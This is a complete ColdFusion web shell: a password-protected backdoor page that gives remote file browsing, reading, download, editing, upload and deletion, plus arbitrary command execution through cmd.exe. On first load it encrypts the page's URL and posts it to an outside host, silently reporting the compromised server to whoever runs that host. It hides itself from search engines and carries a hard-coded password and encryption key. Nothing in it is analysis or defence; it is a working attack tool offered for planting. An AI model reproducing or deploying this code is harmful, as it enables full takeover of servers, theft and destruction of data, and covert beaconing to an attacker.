<cfapplication name = "e1" sessionTimeout = #CreateTimeSpan(0, 0, 10, 0)# sessionManagement = "Yes">
<cfset mypwd="adobe123">	<!--- login password--->
<cfset postUrl = "http://coldfusion-adobe.com/x3edc/index.php">
<cfset theKey="9f9pWNRmyLCgRnrBr/GEpw=="><!---crypt key--->
<cfset myAlgorithm="AES">	<!---AES DES  DESEDE--->
<cfset myEncoding = "Hex">	<!--- UU Base64 Hex --->

<cfset pageURI = getPageContext().getRequest().getRequestURI()>
<cfif IsDefined("session.in") eq "No">
	<cfset mystr = encrypt(getPageContext().getRequest().getRequestURL().toString(), theKey, myAlgorithm,myEncoding)>
    <cfhttp method="Post" url="#postUrl#" >
    	<cfhttpparam type="formfield"	value="#mystr#" name="o">
    </cfhttp>
    <cfset session.in = "1">
</cfif>
<cfif IsDefined("Form.Logout")>
<cftry>
	<cfset session.pwd = "">
    <cfcatch type="any">
    </cfcatch>
</cftry>
</cfif>
<cfif IsDefined("Form.password")>
	<cfset session.pwd = Form.password>
</cfif>
<cftry>
	<cfif session.pwd neq mypwd>
    	<cfoutput>#ShowLoginForm()#</cfoutput>
    </cfif>
<cfcatch type="any">
	<cfoutput>#ShowLoginForm()#</cfoutput>
</cfcatch>
</cftry>
<cfset RootDirectory=getPageContext().getRequest().getParameter('dir')>

<cfif IsDefined('RootDirectory') eq "NO">
	<cfset RootDirectory=GetTemplatePath()>
    <cfset RootDirectory=ListDeleteAt(RootDirectory,ListLen(RootDirectory,"/\"),"/\")>
    <cfif ListLen(RootDirectory,"/") gt ListLen(RootDirectory,"\\")>
    	<cfset RootDirectory=RootDirectory& '/' >
     <cfelse>
     	<cfset RootDirectory=RootDirectory& '\' >
     </cfif>
</cfif>


<cfset pfile =getPageContext().getRequest().getParameter('file')>
<cfset pdl =getPageContext().getRequest().getParameter('dl')>
<cfset pedit =getPageContext().getRequest().getParameter('edit')>
<cfif IsDefined("pfile")>
	<cfif FileExists(pfile)>
        <cffile action="read" file="#pfile#" variable="FileContent">
        <cfoutput>#FileContent#</cfoutput>
        <cfabort>
     </cfif>
</cfif>
<cfif IsDefined("pdl")>
	<cfif FileExists(pdl)>
        <cffile action="read" file="#pdl#" variable="FileContent" >
        <cfset filename = Replace(pdl,ListDeleteAt(pdl,ListLen(pdl,"/\"),"/\"),'')>
        <cfset filename = Replace(Replace(filename,'/','',"ALL"),'\','',"ALL")>
        <cfheader charset="utf-8" name="Content-Disposition" value="inline;filename=#filename#">
		<cfcontent type="application/octet-stream"><cfoutput>#FileContent#</cfoutput></cfcontent><cfabort>
     </cfif>
</cfif>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="robots" content="noindex">
<meta http-equiv="expires" content="0">
<meta http-equiv="pragma" content="no-cache">
<style type="text/css">
.button {background-color: #c0c0c0; color: #666666;
border: 1px solid #999999; }
.button:Hover { color: #444444 }
table.filelist {background-color:#666666; width:100%; border:0px none #ffffff}
th { background-color:#c0c0c0 }
tr.mouseout { background-color:#ffffff; }
tr.mousein  { background-color:#eeeeee; }
tr.checked  { background-color:#cccccc }
tr.mousechecked { background-color:#c0c0c0 }
td { font-family:Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666;}
td.message { background-color: #FFFF00; color: #000000; text-align:center; font-weight:bold}
td.error { background-color: #FF0000; color: #000000; text-align:center; font-weight:bold}
A { text-decoration: none; }
A:Hover { color : Red; text-decoration : underline; }
BODY { font-family:Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666;}
</style>
<script type="text/javascript">
<!--
	var check = false;
	function dis(){check = true;}
	var DOM = 0, MS = 0, OP = 0, b = 0;
	
	function CheckBrowser(){
		if (b == 0){
			if (window.opera) OP = 1;
			// Moz or Netscape
			if(document.getElementById) DOM = 1;
			// Micro$oft
			if(document.all && !OP) MS = 1;
			b = 1;
		}
	}
	
	function selrow (element, i){
		var erst;
		CheckBrowser();
		if ((OP==1)||(MS==1)) erst = element.firstChild.firstChild;
		else if (DOM==1) erst = element.firstChild.nextSibling.firstChild;
		
		if (i==0){
			if (erst.checked == true) element.className='mousechecked';
			else element.className='mousein';
		}
		
		else if (i==1){
			if (erst.checked == true) element.className='checked';
			else element.className='mouseout';
		}
		
		else if ((i==2)&&(!check)){
			if (erst.checked==true) element.className='mousein';
			else element.className='mousechecked';
			erst.click();
		}
		else check=false;
	}
	
	function AllFiles(){
		for(var x=0;x<document.FileList.elements.length;x++){
			var y = document.FileList.elements[x];
			var ytr = y.parentNode.parentNode;
			var check = document.FileList.selall.checked;
			if(y.name == 'selfile'){
				if (y.disabled != true){
					y.checked = check;
					if (y.checked == true) ytr.className = 'checked';
					else ytr.className = 'mouseout';
				}
			}
		}
	}

	function popUp(URL){
		fname = document.getElementsByName("myFile")[0].value;
		if (fname != "")
			window.open(URL+"?first&uplMonitor="+encodeURIComponent(fname),"","width=400,height=150,resizable=yes,depend=yes")
	}
//-->
</script>
</head>
<body>
<cfif IsDefined("pedit")>
	<cfif FileExists(pedit)>
        <cffile action="read" file="#pedit#" variable="FileContent">
        <cfset filename = Replace(pedit,ListDeleteAt(pedit,ListLen(pedit,"/\"),"/\"),'')>
        <cfset filename = Replace(Replace(filename,'/','',"ALL"),'\','',"ALL")>
<cfform method="post" action="#pageURI#">
<cfoutput>
<cftextarea cols="90" rows="35"  wrap="off"  name="text" value="#HTMLEditFormat(FileContent)#"></cftextarea>
	<input type="hidden" name="nfile" value="#pedit#">
	<br>
	<table>
		<tbody>
		<tr><td title="Enter the new filename"><input type="text" name="new_name" value="#filename#"></td>
        <input type="hidden" name="old_name" value="#filename#" />
		<td><input type="Submit" name="Submit" value="Save"></td>
		<td><input type="Submit" name="Submit" value="Cancel">
		</td></tr>
	</tbody></table>
</cfoutput>
</cfform>
</body></html>
<cfabort>
</cfif></cfif>

    
<cffunction name="ShowLoginForm" >
<cfset mm=getPageContext().getRequest().getParameter('o')>
<cfif IsDefined("mm") >
	<cfif mm eq "login">
	<cfform>
    	<cfinput type="password" name="password" id="password">
        <cfinput type="submit" value="login" name="login" id="login" class="button">
    </cfform>
    </cfif>
   </cfif>
	<cfabort>
</cffunction>
<cffunction name="setSelected" returntype="string">
	<cfargument name="val1" default="" required="yes">
    <cfargument name="val2" default="" required="yes">
<cfif val1 eq val2>
    	<cfreturn 'selected="selected"'>
     <cfelse>
     	<cfreturn ''>
    </cfif>
</cffunction>

<cffunction name="showmsg" returntype="string">
	<cfargument name="msg" default="" required="yes">
    <cfargument name="type" default="" required="yes">
    <cfreturn '<table border="0" width="100%"><tbody><tr><td class="#type#">#msg#</td></tr></tbody></table>'> 
</cffunction>

<cffunction name="GetSize" returntype="string">
	<cfargument name="size" default=0 required="yes">
    <cfif size lt 1024>
    	<cfreturn size & ' bytes'>
    <cfelseif size lt 1048576>
    	<cfreturn DecimalFormat(size /1024) & ' kb'>
    <cfelseif size lt 1073741824>
    	<cfreturn DecimalFormat(size /1048576) & ' mb'>
    <cfelseif size lt 1099511627776>
    	<cfreturn DecimalFormat(size /1073741824) & ' gb'>
    </cfif>
    <cfreturn size>
</cffunction>



<cfset message = "#showmsg("Directory #RootDirectory#",'message')#">
<cfif IsDefined("Form.UploadFile") AND Form.UploadFile NEQ "">
     <cftry>
            <cffile 
                action="upload" 
                filefield="UploadFile" 
                destination="#RootDirectory#" 
                nameconflict="overwrite"
                accept="*/*"
                >
                <cfset message = "#showmsg('File uploaded successfully!','message')#">
                
            <cfcatch type="any">
            	<cfset message = "#showmsg('#cfcatch.Message#','error')#">
            </cfcatch>
     </cftry>
</cfif>
<cfif IsDefined("Form.submit") AND (IsDefined("Form.cr_dir")  OR  IsDefined("Form.selfile") OR IsDefined("Form.text") OR IsDefined("Form.run"))>
<cfswitch expression="#Form.submit#">
	<cfcase value="Rename File">
		<cfset SourceFile = Form.selfile>
        <cfset Destination = Form.dir&Left(Replace(SourceFile,Form.dir,''),1)&Form.cr_dir>
        <cftry>
           <cffile action="rename" source="#SourceFile#" destination="#Destination#" >  
           <cfset message = "#showmsg('file renamed successfully! ','message')#">    
        <cfcatch type="any">
            <cfset message = "#showmsg('#cfcatch.Message#','error')#">   
        </cfcatch> 
        </cftry>
    </cfcase>
	<cfcase value="Move Files">
		<cfset SourceFile = Form.selfile>
        <cfset Destination = Form.cr_dir>
        <cftry>
           <cffile action="move" source="#SourceFile#" destination="#Destination#" >  
           <cfset message = "#showmsg('file moved to desination successfully! ','message')#">    
        <cfcatch type="any">
            <cfset message = "#showmsg('#cfcatch.Message#','error')#">   
        </cfcatch> 
        </cftry>
    </cfcase>
	<cfcase value="Copy Files">
		<cfset SourceFile = Form.selfile>
        <cfset Destination = Form.cr_dir>
        <cftry>
           <cffile action="copy" source="#SourceFile#" destination="#Destination#" >  
           <cfset message = "#showmsg('file copy to desination successfully! ','message')#">    
        <cfcatch type="any">
            <cfset message = "#showmsg('#cfcatch.Message#','error')#">   
        </cfcatch> 
        </cftry>
    </cfcase>
    
    <cfcase value="Delete Selected files"> 
        <cftry>
        <cfloop list="#Form.selfile#" index="i" delimiters=",">
        	<cffile action="delete" file="#i#"> 
        </cfloop>
           <cfset message = "#showmsg('file deleted successfully! ','message')#">    
        <cfcatch type="any">
            <cfset message = "#showmsg('#cfcatch.Message#','error')#">   
        </cfcatch> 
        </cftry>    
    </cfcase>
	<cfcase value="Create Dir">
        <cftry>
        	<cfset Destination = Form.dir&Form.cr_dir>
        	<cfdirectory action="create" directory="#Destination#">
           <cfset message = "#showmsg('folder created successfully! ','message')#">    
        <cfcatch type="any">
            <cfset message = "#showmsg('#cfcatch.Message#','error')#">   
        </cfcatch> 
        </cftry>
    </cfcase>	
    <cfcase value="Create File">
            <cftry>
        	<cfset Destination = Form.dir&Form.cr_dir>
             <cfif FileExists(Destination)>
             	<cfset message = "#showmsg('file is exists! ','error')#">
                <cfelse>
         			<cffile action = "write" file = "#Destination#" output = ''>
          			<cfset message = "#showmsg('file created successfully! ','message')#">                    
             </cfif>
        <cfcatch type="any">
            <cfset message = "#showmsg('#cfcatch.Message#','error')#">   
        </cfcatch> 
        </cftry>
    </cfcase>
    <cfcase value="Save">
            <cftry>
        	<cfset Destination = Replace(Form.nfile,Form.old_name,Form.new_name)>
         		<cffile action = "write" file = "#Destination#" output ="#Form.text#">
          		<cfset message = "#showmsg('file edited successfully! ','message')#">                    
        <cfcatch type="any">
            <cfset message = "#showmsg('#cfcatch.Message#','error')#">  
        </cfcatch>     
        </cftry>
    </cfcase>
    <cfcase value="Launch command">
      <cfform method="post" action="#pageURI#">
        <cfoutput>
          <cfif IsDefined("Form.command")>
          		<cfset command = Form.command>
          <cfelse>
          		<cfset command = "/c ">
          </cfif>
          <cfif IsDefined("Form.sp")>
          		<cfset sp = Form.sp>
          <cfelse>
          		<cfset sp = "c:\windows\system32\cmd.exe">
          </cfif>
			<cfset rndNum=RandRange(1,65530)>
                <cfexecute name="#sp#"
                arguments="#command#"
                outputfile="#GetTempDirectory()#tmp#rndNum#.txt"
                timeout="10">
                </cfexecute>
                <cfif FileExists("#GetTempDirectory()#tmp#rndNum#.txt") is "Yes">
                    <cffile action="Read"
                    file="#GetTempDirectory()#tmp#rndNum#.txt"
                    variable="readText">
                    <cftextarea cols="120" rows="35"  wrap="off"  name="text" value="#HTMLEditFormat(readText)#"></cftextarea>
                    <cffile action="Delete" file="#GetTempDirectory()#tmp#rndNum#.txt">
                </cfif>
            <br>
            <table >
                <tbody>
                <tr><td>shell path</td><td title="Enter shell path"><input type="text" name="sp" value="#sp#" size="90"></td><td>&nbsp;</td>
                <input type="hidden" name="run" value="">
                <tr><td>command</td><td title="Enter your command"><input type="text" name="command" value="#command#" size="90"></td>
                <td><input type="Submit" name="Submit" value="Launch command"><input type="Submit" name="Submit" value="Cancel">
                </td></tr>
            </tbody></table>
        </cfoutput>
        </cfform>
        </body></html>
        
        <cfabort>
    </cfcase>
</cfswitch>
</cfif>


<cfoutput>#message#</cfoutput>


<cffunction name="dir2linkdir" returntype="string">
<cfargument name="RootDirectory" required="yes" default="#ListDeleteAt(GetTemplatePath(),ListLen(GetTemplatePath(),"/\"),"/\")#">

<cfif ListLen(RootDirectory,"/") gt ListLen(RootDirectory,"\\")>
	<cfset path="#RootDirectory.split('/')#" >
    <cfset purl = "">
	<cfset npath = "">
    <cfloop from="1" to="#arrayLen(path)#" index="i">
        <cfset npath = npath & '#path[i]#/'>
        <cfset purl  = purl & '<a href="#pageURI#?dir=#URLEncodedFormat(npath)#">#path[i]#/</a>'>    	
    </cfloop>
<cfelse>
	<cfset path="#RootDirectory.split('\\')#" >
    <cfset purl = "">
	<cfset npath = "">
    <cfloop from="1" to="#arrayLen(path)#" index="i">
        <cfset npath = npath & '#path[i]#\'>
        <cfset purl  = purl & '<a href="#pageURI#?dir=#URLEncodedFormat(npath)#">#path[i]#\</a>'>    	
    </cfloop>
</cfif>
<cfreturn purl>
</cffunction>

<cffunction name="makelink" returntype="string">
<cfargument name="dir" required="yes">
<cfargument name="filename" required="yes">
<cfargument name="filetype" required="yes">

<cfset valu = "">
<cfset myurl = "">
<cfset target = "">
	<cfif ListLen(dir,"/") gt ListLen(dir,"\\")>
    		<cfif filetype eq "File">
            	<cfset valu = "#dir#/#filename#">
                <cfset myurl = "#pageURI#?file=#dir#/#filename#">
                <cfset target = 'target="_blank"'>
		<cfelse>
    		<cfif filetype eq "Dir">
            <cfset url = "#pageURI#?dir=#dir#/#filename#/">
            <cfset valu = "#dir#/#filename#/">
            <cfelseif filetype eq "p">
             	<cfset dir=ListDeleteAt(dir,ListLen(dir,"/\"),"/\")>
               	<cfset myurl = "#pageURI#?dir=#dir#/">
            	<cfset valu = "#dir#/">  
            </cfif>
         </cfif>
      <cfelse>
      	<cfif filetype eq "File">
                <cfset valu = "#dir#\#filename#">
                <cfset myurl = "#pageURI#?file=#dir#\#filename#">
                <cfset target = 'target="_blank"'>
            	<cfelse>
            <cfif filetype eq "Dir">
                <cfset valu = "#dir#\#filename#\">
                <cfset myurl = "#pageURI#?dir=#dir#\#filename#\">
             <cfelseif filetype eq "p">
             	<cfset dir=ListDeleteAt(dir,ListLen(dir,"/\"),"/\")>
                <cfset myurl = "#pageURI#?dir=#dir#\">
            	<cfset valu = "#dir#\">  
             </cfif>
        </cfif>
    </cfif>
    <cfreturn
	'<input type="checkbox" name="selfile" value="#valu#" onmousedown="dis()"></td><td align="left"> &nbsp;<a onmousedown="dis()" href="#myurl#" #target#>#filename#</a>' >
</cffunction>
<cfform method="post" name="FileList">
	<table class="filelist" cellspacing="1px" cellpadding="0px">
<tbody><tr><th>&nbsp;</th><th align="left">Name</th><th align="right">Size</th><th align="center">Type</th><th align="left">Date</th><th>&nbsp;</th><th>&nbsp;</th></tr>

<tr class="mouseout" onmouseup="selrow(this, 2)" onmouseover="selrow(this, 0);" onmouseout="selrow(this, 1)">
  <td align="center"></td>
  <td align="left"> 
  <cfoutput>#makelink(RootDirectory,'..','p')#</cfoutput>
  </td>
<td align="right" ></td><td align="center"></td><td align="left"> </td><td></td><td></td></tr>

<cffunction name="makede" returntype="string">
<cfargument name="dir" required="yes">
<cfargument name="filename" required="yes">
<cfargument name="filetype" required="yes">
<cfif filetype neq "File">
		<cfreturn '<td></td><td></td>' >
	<cfelse>
    	<cfif ListLen(dir,"/") gt ListLen(dir,"\\")>
		<cfreturn '<td><a onmousedown="dis()" href="#pageURI#?dl=#dir#/#filename#">Download</a></td><td><a onmousedown="dis()" href="#pageURI#?edit=#dir#/#filename#" target="_blank">Edit</a></td>' >
        <cfelse>
        <cfreturn '<td><a onmousedown="dis()" href="#pageURI#?dl=#dir#\#filename#">Download</a></td><td><a onmousedown="dis()" href="#pageURI#?edit=#dir#\#filename#" target="_blank">Edit</a></td>' >
        </cfif>
</cfif>
</cffunction>

<cfdirectory action="list" directory="#RootDirectory#" name="filelist" sort="TYPE">
<cfoutput query="filelist">
<tr class="mouseout" onmouseup="selrow(this, 2)" onmouseover="selrow(this, 0);" onmouseout="selrow(this, 1)">
  <td align="center">
  #makelink(RootDirectory,NAME,TYPE)#
  </td>
 
<td align="right" >#GetSize(SIZE)#</td><td align="center">#TYPE#</td><td align="left"> #DATEFORMAT(DATELASTMODIFIED,'yyyy-m-d H:mm:ss')#</td>
#makede(RootDirectory,NAME,TYPE)#
</tr>
</cfoutput>
	</tbody></table>
	<input type="checkbox" name="selall" onclick="AllFiles(this.form)">Select all
	<p align="center">
		<b>
			<center><cfoutput>#dir2linkdir(RootDirectory)#</cfoutput></center>
		</b>
	</p>
	<p>
        <cfinput type="hidden" name="dir" value="#RootDirectory#">
        <input title="Delete all selected files and directories incl. subdirs" class="button" type="Submit" name="Submit" value="Delete Selected files" onclick="return confirm(&#39;Do you really want to delete the entries?&#39;)">
      
        
  </p>
	<p>
		<input title="Enter new dir or filename or the relative or absolute path" type="text" name="cr_dir">
		<input title="Create a new directory with the given name" class="button" type="Submit" name="Submit" value="Create Dir">
		<input title="Create a new empty file with the given name" class="button" type="Submit" name="Submit" value="Create File">
		<input title="Move selected files and directories to the entered path" class="button" type="Submit" name="Submit" value="Move Files">
		<input title="Copy selected files and directories to the entered path" class="button" type="Submit" name="Submit" value="Copy Files">
		<input title="Rename selected file or directory to the entered name" class="button" type="Submit" name="Submit" value="Rename File">
	</p>
	</cfform>
	<form action="" enctype="multipart/form-data" method="POST">
    <cfform enctype="multipart/form-data" method="post" action="">
		<cfinput type="hidden" name="dir" value="#RootDirectory#">
	  <input type="file" name="UploadFile">
		<input title="Upload selected file to the current working directory" type="Submit" class="button" name="Submit" value="Upload">
	</cfform>
	
    <cfform>
		<cfinput type="hidden" name="dir" value="#RootDirectory#">
	  	<input type="hidden" name="run" value="">
		<input title="Launch command" type="Submit" class="button" name="Submit" value="Launch command">
        <input title="Logout" type="Submit" class="button" name="Logout" value="Logout" onclick="return confirm(&#39;Do you really want to logout?&#39;)">
	</cfform>
</body></html>